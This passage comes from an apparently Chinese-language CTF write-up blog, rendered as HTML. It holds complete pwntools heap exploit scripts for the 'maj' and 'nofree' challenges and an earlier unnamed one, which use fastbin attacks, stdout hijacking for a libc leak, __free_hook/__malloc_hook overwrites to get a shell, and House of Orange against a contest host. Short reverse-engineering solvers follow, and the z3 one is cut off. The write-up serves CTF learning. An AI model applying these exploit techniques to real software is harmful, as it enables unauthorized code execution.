class="string">&quot;1&quot;</span>)</span><br><span class="line">        p.recvuntil(<span class="string">&quot;idx:&quot;</span>)</span><br><span class="line">        p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">        p.recvuntil(<span class="string">&quot;len:&quot;</span>)</span><br><span class="line">        p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">        p.recvuntil(<span class="string">&quot;content:&quot;</span>)</span><br><span class="line">        p.send(data)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">        p.recvuntil(<span class="string">&quot;&gt;&gt;&gt;&quot;</span>)</span><br><span class="line">        p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">        p.recvuntil(<span class="string">&quot;idx:&quot;</span>)</span><br><span class="line">        p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">    <span class="comment">#one = [0x45216,0x4526a,0xf02a4,0xf1147]</span></span><br><span class="line">    one = [<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf0364</span>,<span class="number">0xf1207</span>]</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0xf8</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0xf8</span>)</span><br><span class="line">    add(<span class="number">1</span>,<span class="number">0xf8</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0xf8</span>)</span><br><span class="line">    add(<span class="number">2</span>,<span class="number">0xf8</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0xf8</span>)</span><br><span class="line">    add(<span class="number">3</span>,<span class="number">0xf8</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0xf8</span>)</span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line">    add(<span class="number">2</span>,<span class="number">0xf8</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0xf0</span>+p64(<span class="number">0x300</span>)+<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    free(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0xe8</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0xe8</span>)</span><br><span class="line">    add(<span class="number">4</span>,<span class="number">0xf8</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x71</span>)+<span class="string">&#x27;a&#x27;</span>*<span class="number">0x68</span>+p64(<span class="number">0x81</span>))</span><br><span class="line">    free(<span class="number">4</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0xf8</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    add(<span class="number">5</span>,<span class="number">0xf8</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    add(<span class="number">6</span>,<span class="number">0xf8</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    free(<span class="number">5</span>)</span><br><span class="line">    add(<span class="number">7</span>,<span class="number">0xf8</span>,<span class="string">&#x27;\xdd\x25&#x27;</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    free(<span class="number">7</span>)</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0xe8</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0xe8</span>)</span><br><span class="line">    add(<span class="number">8</span>,<span class="number">0xf8</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x71</span>))</span><br><span class="line"></span><br><span class="line">    add(<span class="number">7</span>,<span class="number">0x68</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    add(<span class="number">9</span>,<span class="number">0x68</span>,<span class="string">&#x27;\x00&#x27;</span>*<span class="number">3</span>+p64(<span class="number">0</span>)*<span class="number">6</span>+p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    p.recvuntil(p64(<span class="number">0xfbad1800</span>))</span><br><span class="line">    p.recv(<span class="number">32</span>)</span><br><span class="line">    libc.address = u64(p.recv(<span class="number">6</span>)+<span class="string">&#x27;\x00\x00&#x27;</span>) -<span class="number">0x3C56A3</span></span><br><span class="line">    <span class="built_in">print</span> <span class="built_in">hex</span>(libc.address)</span><br><span class="line"></span><br><span class="line">    free(<span class="number">8</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    free(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0xa</span>,<span class="number">0xf8</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    add(<span class="number">0xb</span>,<span class="number">0xe8</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    add(<span class="number">0xc</span>,<span class="number">0xf8</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x71</span>)+<span class="string">&#x27;a&#x27;</span>*<span class="number">0x68</span>+p64(<span class="number">0x81</span>))</span><br><span class="line">    add(<span class="number">0xd</span>,<span class="number">0xe8</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line">    free(<span class="number">0xc</span>)</span><br><span class="line">    add(<span class="number">0xc</span>,<span class="number">0xf8</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x71</span>)+p64(libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]-<span class="number">0x23</span>))</span><br><span class="line">    add(<span class="number">1</span>,<span class="number">0x68</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    add(<span class="number">2</span>,<span class="number">0x68</span>,<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0xb</span>+p64(libc.sym[<span class="string">&#x27;realloc&#x27;</span>]+<span class="number">6</span>)+p64(libc.address+one[<span class="number">3</span>]))</span><br><span class="line">    <span class="comment">#gdb.attach(p,&#x27;b malloc&#x27;)</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;&gt;&gt;&gt;&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;idx:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;len:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">0x48</span>))</span><br><span class="line">    p.interactive()</span><br><span class="line"><span class="comment">#exp()</span></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        exp()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;fail&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="maj"><a href="#maj" class="headerlink" title="maj"></a>maj</h3><h4 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h4><p>存在大量混淆，可以直接忽略。</p><p>free时未清空堆指针，从而可以利用堆错位来伪造size位等，实现将同一个地址先后free进fastbin和unsortbin，进而利用main_arean劫持stdout结构(1/16概率)，使用io_leak的方法获取到libc地址。</p><p>并且因为没有开启pie，因而可以劫持堆指针。</p><p>构造一个堆指针指向<code>__free_hook</code>，将其改为system，从而实现getshell。</p><h4 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = process(&quot;./pwn&quot;)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./pwn&quot;</span>).libc</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    p = remote(<span class="string">&quot;101.200.53.148&quot;</span> ,<span class="string">&quot;15423&quot;</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,data</span>):</span></span><br><span class="line">        p.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">        p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">        p.recvuntil(<span class="string">&quot;please answer the question&quot;</span>)</span><br><span class="line">        p.sendline(<span class="string">&quot;82&quot;</span>)</span><br><span class="line">        p.recvuntil(<span class="string">&quot;you are right&quot;</span>)</span><br><span class="line">        p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">        p.recvuntil(<span class="string">&quot;start_the_game,yes_or_no?&quot;</span>)</span><br><span class="line">        p.send(data)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">        p.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">        p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">        p.recvuntil(<span class="string">&quot;index ?&quot;</span>)</span><br><span class="line">        p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,data</span>):</span></span><br><span class="line">        p.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">        p.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">        p.recvuntil(<span class="string">&quot;index ?&quot;</span>)</span><br><span class="line">        p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">        p.recvuntil(<span class="string">&quot;__new_content ?&quot;</span>)</span><br><span class="line">        p.send(data)</span><br><span class="line">    add(<span class="number">0x68</span>,<span class="string">&#x27;aaa&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">    add(<span class="number">0x68</span>,<span class="string">&#x27;aaa&#x27;</span>)<span class="comment">#1</span></span><br><span class="line">    add(<span class="number">0x7f</span>,<span class="string">&#x27;aaa&#x27;</span>)<span class="comment">#2</span></span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    edit(<span class="number">0</span>,p64(<span class="number">0x603260</span>))</span><br><span class="line">    add(<span class="number">0x68</span>,<span class="string">&#x27;aaa&#x27;</span>)<span class="comment">#3</span></span><br><span class="line">    add(<span class="number">0x68</span>,<span class="string">&#x27;aaa&#x27;</span>)<span class="comment">#4</span></span><br><span class="line">    edit(<span class="number">4</span>,p32(<span class="number">0xff</span>)*<span class="number">24</span>)</span><br><span class="line">    edit(<span class="number">4</span>,p32(<span class="number">0xff</span>)*<span class="number">28</span>+p64(<span class="number">0x6032e0</span>))</span><br><span class="line">    edit(<span class="number">0</span>,p64(<span class="number">0x6032e0</span>)+p64(<span class="number">0x603260</span>))</span><br><span class="line">    add(<span class="number">0x88</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x48</span>+p64(<span class="number">0x21</span>))<span class="comment">#5</span></span><br><span class="line">    edit(<span class="number">5</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x68</span>+p64(<span class="number">0x21</span>))</span><br><span class="line">    add(<span class="number">0x18</span>,<span class="string">&#x27;aaa&#x27;</span>)<span class="comment">#6</span></span><br><span class="line">    add(<span class="number">0x68</span>,<span class="string">&#x27;aaa&#x27;</span>)<span class="comment">#7</span></span><br><span class="line">    edit(<span class="number">0</span>,p64(<span class="number">0x6032e0</span>)+p64(<span class="number">0x603260</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">&#x27;\x70&#x27;</span>)</span><br><span class="line">    edit(<span class="number">5</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x71</span>))</span><br><span class="line">    edit(<span class="number">0</span>,p64(<span class="number">0x6032e0</span>)+p64(<span class="number">0x603260</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">&#x27;\x80&#x27;</span>)</span><br><span class="line">    free(<span class="number">5</span>)</span><br><span class="line">    edit(<span class="number">0</span>,p64(<span class="number">0x6032e0</span>)+p64(<span class="number">0x603260</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">&#x27;\x70&#x27;</span>)</span><br><span class="line">    edit(<span class="number">5</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x91</span>))</span><br><span class="line">    edit(<span class="number">0</span>,p64(<span class="number">0x6032e0</span>)+p64(<span class="number">0x603260</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">&#x27;\x80&#x27;</span>)</span><br><span class="line">    free(<span class="number">5</span>)</span><br><span class="line">    edit(<span class="number">5</span>,<span class="string">&#x27;\xdd\x25&#x27;</span>)</span><br><span class="line">    edit(<span class="number">0</span>,p64(<span class="number">0x6032e0</span>)+p64(<span class="number">0x603260</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">&#x27;\x70&#x27;</span>)</span><br><span class="line">    edit(<span class="number">5</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x71</span>))</span><br><span class="line">    add(<span class="number">0x68</span>,<span class="string">&#x27;aaa&#x27;</span>)<span class="comment">#2</span></span><br><span class="line">    add(<span class="number">0x68</span>,<span class="string">&#x27;aaa&#x27;</span>)<span class="comment">#3</span></span><br><span class="line">    edit(<span class="number">3</span>,<span class="string">&#x27;\x00&#x27;</span>*<span class="number">3</span>+p64(<span class="number">0</span>)*<span class="number">6</span>+p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    p.recvuntil(p64(<span class="number">0xfbad1800</span>))</span><br><span class="line">    p.recv(<span class="number">32</span>)</span><br><span class="line">    libc.address = u64(p.recv(<span class="number">6</span>)+<span class="string">&#x27;\x00\x00&#x27;</span>) -<span class="number">0x3C56A3</span></span><br><span class="line">    <span class="built_in">print</span> <span class="built_in">hex</span>(libc.address)</span><br><span class="line">    edit(<span class="number">0</span>,p64(<span class="number">0x6032e0</span>)+p64(<span class="number">0x603260</span>)+p64(libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]))</span><br><span class="line">    edit(<span class="number">2</span>,p64(libc.sym[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    edit(<span class="number">6</span>,<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">    free(<span class="number">6</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        exp()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;fail&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="nofree"><a href="#nofree" class="headerlink" title="nofree"></a>nofree</h3><p>strdup存在00截断，因而可以溢出堆块。通过 House of Orange 构造使top chunk进入0x70的fastbin中，从而控制堆指针，达到任意写。</p><p>这里采用爆破第4位（概率为1/16）的方式将read改为onegadget，从而getshell。</p><h4 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    <span class="comment">#p = process(&quot;./pwn&quot;)</span></span><br><span class="line">    p = remote(<span class="string">&quot;101.200.53.148&quot;</span>,<span class="string">&quot;12301&quot;</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">idx,size,data</span>):</span></span><br><span class="line">        p.recvuntil(<span class="string">&quot;choice&gt;&gt; &quot;</span>)</span><br><span class="line">        p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">        p.recvuntil(<span class="string">&quot;idx: &quot;</span>)</span><br><span class="line">        p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">        p.recvuntil(<span class="string">&quot;size: &quot;</span>)</span><br><span class="line">        p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">        p.recvuntil(<span class="string">&quot;content: &quot;</span>)</span><br><span class="line">        p.send(data)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,data</span>):</span></span><br><span class="line">        p.recvuntil(<span class="string">&quot;choice&gt;&gt; &quot;</span>)</span><br><span class="line">        p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">        p.recvuntil(<span class="string">&quot;idx: &quot;</span>)</span><br><span class="line">        p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">        p.recvuntil(<span class="string">&quot;content: &quot;</span>)</span><br><span class="line">        p.send(data)</span><br><span class="line">    one = [<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf0364</span>,<span class="number">0xf1207</span>]</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x90</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    edit(<span class="number">0</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x10</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x0fe1</span>))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x18</span>):</span><br><span class="line">        add(<span class="number">0</span>,<span class="number">0x90</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x90</span>)</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x71</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x40</span>)</span><br><span class="line">    add(<span class="number">2</span>,<span class="number">0x90</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x90</span>)</span><br><span class="line">    edit(<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x40</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x71</span>)+p64(<span class="number">0x6021c0</span>))</span><br><span class="line">    add(<span class="number">1</span>,<span class="number">0x71</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x60</span>)</span><br><span class="line">    add(<span class="number">1</span>,<span class="number">0x71</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x60</span>)</span><br><span class="line">    edit(<span class="number">1</span>,p64(<span class="number">0x6021c0</span>)+p64(<span class="number">0xfffff</span>))</span><br><span class="line">    edit(<span class="number">1</span>,p64(<span class="number">0x6021c0</span>)+p64(<span class="number">0xfffff</span>))</span><br><span class="line">    <span class="comment">#0-&gt;heap_ptr</span></span><br><span class="line">    edit(<span class="number">0</span>,p64(<span class="number">0x6021c0</span>)+p64(<span class="number">0xfffff</span>)+p64(<span class="number">0x0602048</span>)+p64(<span class="number">0xffff</span>))</span><br><span class="line">    edit(<span class="number">1</span>,<span class="string">&#x27;\x64\x03&#x27;</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(p,&#x27;b *0x400934&#x27;)</span></span><br><span class="line">    p.interactive()</span><br><span class="line"><span class="comment">#exp()</span></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        exp()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;fail&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h2><h3 id="hyperthreading"><a href="#hyperthreading" class="headerlink" title="hyperthreading"></a>hyperthreading</h3><p>简单加解密</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">res=[<span class="number">0xDD</span>, <span class="number">0x5B</span>, <span class="number">0x9E</span>, <span class="number">0x1D</span>, <span class="number">0x20</span>, <span class="number">0x9E</span>, <span class="number">0x90</span>, <span class="number">0x91</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x91</span>, <span class="number">0x92</span>, <span class="number">0xDE</span>, <span class="number">0x8B</span>, <span class="number">0x11</span>, <span class="number">0xD1</span>, <span class="number">0x1E</span>, <span class="number">0x9E</span>, <span class="number">0x8B</span>, <span class="number">0x51</span>, <span class="number">0x11</span>, <span class="number">0x50</span>, <span class="number">0x51</span>, <span class="number">0x8B</span>, <span class="number">0x9E</span>, <span class="number">0x5D</span>, <span class="number">0x5D</span>, <span class="number">0x11</span>, <span class="number">0x8B</span>, <span class="number">0x90</span>, <span class="number">0x12</span>, <span class="number">0x91</span>, <span class="number">0x50</span>, <span class="number">0x12</span>, <span class="number">0xD2</span>, <span class="number">0x91</span>, <span class="number">0x92</span>, <span class="number">0x1E</span>, <span class="number">0x9E</span>, <span class="number">0x90</span>, <span class="number">0xD2</span>, <span class="number">0x9F</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">42</span>):</span><br><span class="line">    res[i]=((res[i]-<span class="number">35</span>)^<span class="number">0x23</span>)&amp;<span class="number">0xff</span></span><br><span class="line"><span class="built_in">print</span>(res)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">42</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(((res[i]&gt;&gt;<span class="number">6</span>)&amp;<span class="number">0xff</span>)^((res[i]&lt;&lt;<span class="number">2</span>)&amp;<span class="number">0xff</span>)),end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="z3"><a href="#z3" class="headerlink" title="z3"></a>z3</h3><p>z3 直接解， 签到题</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">v4 = [<span class="number">0x00004F17</span>, <span class="number">0x00009CF6</span>, <span class="number">0x00008DDB</span>, <span class="number">0x00008EA6</span>, <span class="number">0x00006929</span>, <span class="number">0x00009911</span>, <span class="number">0x000040A2</span>, <span class="number">0x00002F3E</span>, <span class="number">0x000062B6</span>, <span class="number">0x00004B82</span>, <span class="number">0x0000486C</span>, <span class="number">0x00004002</span>, <span class="number">0x000052D7</span>, <span class="number">0x00002DEF</span>, <span class="number">0x000028DC</span>, <span class="number">0x0000640D</span>, <span class="number">0x0000528F</span>, <span class="number">0x0000613B</span>, <span class="number">0x00004781</span>, <span class="number">0x00006B17</span>, <span class="number">0x00003237</span>, <span class="number">0x00002A93</span>, <span class="number">0x0000615F</span>, <span class="number">0x000050BE</span>, <span class="number">0x0000598E</span>, <span class="number">0x00004656</span>, <span class="number">0x00005B31</span>, <span class="number">0x0000313A</span>, <span class="number">0x00003010</span>, <span class="number">0x000067FE</span>, <span class="number">0x00004D5F</span>, <span class="number">0x000058DB</span>, <span class="number">0x00003799</span>, <span class="number">0x000060A0</span>, <span class="number">0x00002750</span>, <span class="number">0x00003759</span>, <span class="number">0x00008953</span>, <span class="number">0x00007122</span>, <span class="number">0x000081F9</span>, <span class="number">0x00005524</span>, <span class="number">0x00008971</span>, <span class="number">0x00003A1D</span>]</span><br><span class="line"></span><br><span class="line">v5 = IntVector(<span class="string">&#x27;x&#x27;</span>, <span class="number">42</span>)</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line"></span><br><span class="line">s.add(v4[<span class="number">0</span>]==<span class="number">34</span>*v5[<span class="number">3</span>]+<span class="number">12</span>*v5[<span class="number">0</span>]+<span class="number">53</span>*v5[<span class="number">1</span>]+<span class="number">6</span>*v5[<span class="number">2</span>]+<span class="number">58</span>*v5[<span class="number">4</span>]+<span class="number">36</span>*v5[<span class="number">5</span>]+v5[<span class="number">6</span>])</span><br><span class="line">s.add(v4[<span class="number">1</span>]==<span class="number">27</span>*v5[<span class="number">4</span>]+<span class="number">73</span>*v5[<span class="number">3</span>]+<span class="number">12</span>*v5[<span class="number">2</span>]+<span class="number">83</span>*v5[<span class="number">0</span>]+<span class="number">85</span>*v5[<span class="number">1</span>]+<span class="number">96</span>*v5[<span class="number">5</span>]+<span class="number">52</span>*v5[<span class="number">6</span>])</span><br><span class="line">s.add(v4[<span class="number">2</span>]==<span class="number">24</span>*v5[<span class="number">2</span>]+<span class="number">78</span>*v5[<span class="number">0</span>]+<span class="number">53</span>*v5[<span class="number">1</span>]+<span class="number">36</span>*v5[<span class="number">3</span>]+<span class="number">86</span>*v5[<span class="number">4</span>]+<span class="number">25</span>*v5[<span class="number">5</span>]+<span class="number">46</span>*v5[<span class="number">6</span>])</span><br><span class="line">s.add(v4[<span class="number">3</span>]==<span class="number">78</span>*v5[<span class="number">1</span>]+<span class="number">39</span>*v5[<span class="number">0</span>]+<span class="number">52</span>*v5[<span class="number">2</span>]+<span class="number">9</span>*v5[<span class="number">3</span>]+<span class="number">62</span>*v5[<span class="number">4</span>]+<span class="number">37</span>*v5[<span class="number">5</span>]+<span class="number">84</span>*v5[<span class="number">6</span>])</span><br><span class="line">s.add(v4[<span class="number">4</span>]==<span class="number">48</span>*v5[<span class="number">4</span>]+<span class="number">14</span>*v5[<span class="number">2</span>]+<span class="number">23</span>*v5[<span class="number">0</span>]+<span class="number">6</span>*v5[<span class="number">1</span>]+<span class="number">74</span>*v5[<span class="number">3</span>]+<span class="number">12</span>*v5[<span class="number">5</span>]+<span class="number">83</span>*v5[<span class="number">6</span>])</span><br><span class="line">s.add(v4[<span class="number">5</span>]==<span class="number">15</span>*v5[<span class="number">5</span>]+<span class="number">48</span>*v5[<span class="number">4</span>]+<span class="number">92</span>*v5[<span class="number">2</span>]+<span class="number">85</span>*v5[<span class="number">1</span>]+<span class="number">27</span>*v5[<span class="number">0</span>]+<span class="number">42</span>*v5[<span class="number">3</span>]+<span class="number">72</span>*v5[<span class="number">6</span>])</span><br><span class="line">s.add(v4[<span class="number">6</span>]==<span class="number">26</span>*v5[<span class="number">5</span>]+<span class="number">67</span>*v5[<span class="number">3</span>]+<span class="number">6</span>*v5[<span class="number">1</span>]+<span class="number">4</span>*v5[<span class="number">0</span>]+<span class="number">3</span>*v5[<span class="number">2</span>]+<span class="number">68</span>*v5[<span class="number">6</span>])</span><br><span class="line">s.add(v4[<span class="number">7</span>]==<span class="number">34</span>*v5[<span class="number">10</span>]+<span class="number">12</span>*v5[<span class="number">7</span>]+<span class="number">53</span>*v5[<span class="number">8</span>]+<span class="number">6</span>*v5[<span class="number">9</span>]+<span class="number">58</span>*v5[<span class="number">11</span>]+<span class="number">36</span>*v5[<span class="number">12</span>]+v5[<span class="number">13</span>])</span><br><span class="line">s.add(v4[<span class="number">8</span>]==<span class="number">27</span>*v5[<span class="number">11</span>]+<span class="number">73</span>*v5[<span class="number">10</span>]+<span class="number">12</span>*v5[<span class="number">9</span>]+<span class="number">83</span>*v5[<span class="number">7</span>]+<span class="number">85</span>*v5[<span class="number">8</span>]+<span class="number">96</span>*v5[<span class="number">12</span>]+<span class="number">52</span>*v5[<span class="number">13</span>])</span><br><span class="line">s.add(v4[<span class="number">9</span>]==<span class="number">24</span>*v5[<span class="number">9</span>]+<span class="number">78</span>*v5[<span class="number">7</span>]+<span class="number">53</span>*v5[<span class="number">8</span>]+<span class="number">36</span>*v5[<span class="number">10</span>]+<span class="number">86</span>*v5[<span class="number">11</span>]+<span class="number">25</span>*v5[<span class="number">12</span>]+<span class="number">46</span>*v5[<span class="number">13</span>])</span><br><span class="line">s.add(v4[<span class="number">10</span>]==<span class="number">78</span>*v5[<span class="number">8</span>]+<span class="number">39</span>*v5[<span class="number">7</span>]+<span class="number">52</span>*v5[<span class="number">9</span>]+<span class="number">9</span>*v5[<span class="number">10</span>]+<span class="number">62</span>*v5[<span class="number">11</span>]+<span class="number">37</span>*v5[<span class="number">12</span>]+<span class="number">84</span>*v5[<span class="number">13</span>])</span><br><span class="line">s.add(v4[<span class="number">11</span>]==<span class="number">48</span>*v5[<span class="number">11</span>]+<span class="number">14</span>*v5[<span class="number">9</span>]+<span class="number">23</span>*v5[<span class="number">7</span>]+<span class="number">6</span>*v5[<span class="number">8</span>]+<span class="number">74</span>*v5[<span class="number">10</span>]+<span class="number">12</span>*v5[<span class="number">12</span>]+<span class="number">83</span>*v5[<span class="number">13</span>])</span><br><span class="line">s.add(v4[<span class="number">12</span>]==<span class="number">15</span>*v5[<span class="number">12</span>]+<span class="number">48</span>*v5[<span class="number">11</span>]+<span class="number">92</span>*v5[<span class="number">9</span>]+<span class="number">85</span>*v5[<span class="number">8</span>]+<span class="number">27</span>*v5[<span class="number">7</span>]+<span class="number">42</span>*v5[<span class="number">10</span>]+<span class="number">72</span>*v5[<span class="number">13</span>])</span><br><span class="line">s.add(v4[<span class="number">13</span>]==<span class="number">26</span>*v5[<span class="number">12</span>]+<span class="number">67</span>*v5[<span class="number">10</span>]+<span class="number">6</span>*v5[<span class="number">8</span>]+<span class="number">4</span>*v5[<span class="number">7</span>]+<span class="number">3</span>*v5[<span class="number">9</span>]+<span class="number">68</span>*v5[<span class="number">13</span>])</span><br><span class="line">s.add(v4[<span class="number">14</span>]==<span class="number">34</span>*v5[<span class="number">17</span>]+<span class="number">12</span>*v5[<span class="number">14</span>]+<span class="number">53</span>*v5[<span class="number">15</span>]+<span class="number">6</span>*v5[<span class="number">16</span>]+<span class="number">58</span>*v5[<span class="number">18</span>]+<span class="number">36</span>*v5[<span class="number">19</span>]+v5[<span class="number">20</span>])</span><br><span class="line">s.add(v4[<span class="number">15</span>]==<span class="number">27</span>*v5[<span class="number">18</span>]+<span class="number">73</span>*v5[<span class="number">17</span>]+<span class="number">12</span>*v5[<span class="number">16</span>]+<span class="number">83</span>*v5[<span class="number">14</span>]+<span class="number">85</span>*v5[<span class="number">15</span>]+<span class="number">96</span>*v5[<span class="number">19</span>]+<span class="number">52</span>*v5[<span 